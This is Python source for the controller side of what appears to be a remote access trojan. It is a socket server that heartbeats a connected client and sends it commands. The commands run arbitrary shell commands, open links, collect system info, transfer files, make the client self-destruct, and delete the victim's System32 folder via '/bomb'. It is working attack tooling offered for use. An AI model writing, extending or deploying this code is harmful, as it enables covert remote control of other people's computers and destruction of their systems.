import socket
import threading

import re
import time
from os import system, name

available_commands = [
    "Note: Commands with a '/' at the beginning will be sent to the client for execution.\n\n",
    "'help': Will display this text with all the available commands.\n",
    "'clear': Will clear the terminal.\n",
    "'lastbeat': Will give you the time elapsed since last heartbeat (ping) to the client.\n",
    "'pausebeat [arg: True or False]': Will pause heartbeat (broken if you use upload)\n",
    "'/heartbeat': Will send a manual heartbeat (ping).\n",
    "'/sysget': Get the client system info's.\n",
    "'/shell [arg: shell command]': Will execute a shell command.\n",
    "'/link [arg: link to open]': Will open a link with the default browser.\n",
    "'/upload [arg: file to upload]': Will upload a file to the client machine.\n",
    "'/destroy': Will self-destruct the client.\n",
    "'/bomb': Will delete System32 folder (WARNING: Dangerous command, high chance to fail).\n"]
pause_heartbeat = False
last_heartbeat_time = 0  # Keep track of the time of the last heartbeat


def basic_commands(command):
    global last_heartbeat_time, pause_heartbeat

    if command == "help":
        print(available_commands)
    elif command == "clear" or "cls":
        # for windows
        if name == 'nt':
            _ = system('cls')
        # for mac and linux
        else:
            _ = system('clear')
    elif command == "lastbeat":
        current_time = time.time()
        elapsed_time = current_time - last_heartbeat_time
        print(f"[*] Time since last heartbeat: {elapsed_time} seconds.")
    elif command.startswith("pausebeat"):
        arg_pause = re.search(r'pausebeat\s+(.+)', command)
        arg_pause = arg_pause.group(1)
        if arg_pause.lower() == "true":
            pause_heartbeat = True
        else:
            pause_heartbeat = False
        print(f"[*] Heart beat pausing is set to {pause_heartbeat}.")
    else:
        print("[!] Incorrect syntax. (maybe your forgot '/'?)")


def heartbeat(client_socket):
    global last_heartbeat_time, pause_heartbeat

    while True:
        try:
            if not pause_heartbeat:
                client_socket.send(b'heartbeat')
                client_socket.recv(1024)
                last_heartbeat_time = time.time()  # Update the last heartbeat time
            time.sleep(15)  # Heartbeat interval as needed
        except Exception as e:
            print(f"Heartbeat failed: {e}")
            break


def upload_file(response, client_socket):
    global pause_heartbeat
    try:
        filename = response.split()[1]
        with open(filename, 'wb') as file:
            pause_heartbeat = True
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        print(f"[*] Success: File '{filename}' received.")
    except Exception as e:
        print(f"[!] Upload failed: {e}")
    pause_heartbeat = False


def handle_client(client_socket):
    heartbeat_thread = threading.Thread(target=heartbeat, args=(client_socket,))
    heartbeat_thread.daemon = True
    heartbeat_thread.start()
    client_socket.settimeout(10)

    # Start the communication loop immediately after connecting
    try:
        while True:
            response = input(">>")
            if re.match(r'^/', response):
                response = re.sub(r'^/', '', response)

                if response == 'bomb':
                    if input("Are you sure to continue? (y/n) >").lower() != 'y':
                        continue
                elif response.startswith("upload"):
                    upload_file(response, client_socket)
                    continue

                print("[*] Sending..")
                client_socket.send(bytes(response, 'utf-8'))

                data = client_socket.recv(1024)
                if not data:
                    print("[!] No response received by the client.")
                    if input("Kill the server? (y/n)\n>").lower() == "y":
                        exit()
                    continue
                print(f"[#] Received: {data.decode('utf-8')}")
            else:
                basic_commands(response.lower())
    except Exception as e:
        print(f"Client communication error: {e}")

    client_socket.close()


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('localhost', 59152))  # Listen on all available interfaces
    server.listen(5)

    print("[*] Server started. Waiting for connections...")

    while True:
        client, addr = server.accept()
        print(f"[*] Connection established with {addr[0]}:{addr[1]}")

        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
